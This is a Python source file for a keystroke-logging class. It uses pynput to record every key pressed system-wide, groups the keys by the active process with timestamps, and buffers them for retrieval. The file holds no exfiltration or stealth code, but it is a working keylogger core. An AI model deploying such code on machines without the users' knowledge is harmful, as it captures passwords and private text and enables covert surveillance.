import threading
from pynput import keyboard 
import time
from processlogger import ProcessLog
import json
from copy import deepcopy

class KeyLog():
    def __init__(self):

        self.process = ProcessLog()   #NOTE: Declared in init so that theres a single instance of the class
        self.buffer = []
        self.last = None

    def _log(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)

        current_process = self.process.current()
                
        if current_process is None:
            return None
        
        name, _title = current_process

        if current_process[0] != self.last:
            self.last = current_process[0]

            self.buffer.append({
            "tstamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())),
            "process": name,
            "keys": [],
            })

        self.buffer[-1]["keys"].append(char)

    def start(self):
        self.listener = keyboard.Listener(on_press=self._log)
        self.listener.start()

    def stop(self):
        self.listener.stop()
    
    def drain(self):
        temp, self.buffer = self.buffer, []
        return temp